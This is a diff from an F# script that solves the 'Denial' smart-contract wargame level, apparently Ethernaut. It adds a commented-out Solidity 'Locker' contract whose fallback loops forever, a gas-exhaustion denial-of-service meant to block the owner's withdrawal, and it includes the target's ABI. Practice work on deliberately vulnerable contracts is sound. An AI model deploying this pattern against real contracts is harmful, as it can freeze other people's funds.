@@ -17,6 +17,14 @@ let txn = makeEthTxn env
 // I'm reasonably certain this would work as a `receive()`-based attack, but since Remix is garbage at this, I can't
 // tell...
 
+(*
+    contract Locker {
+      fallback() external payable {
+          while(true){}
+      }
+  }
+*)
+
 // my instance: 0x029396150651Fe752966aFbfeAe82Cb0c7c0B4Cb
 
 let denialABI = """[{"inputs":[],"name":"contractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"partner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_partner","type":"address"}],"name":"setWithdrawPartner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]""" |> ABI
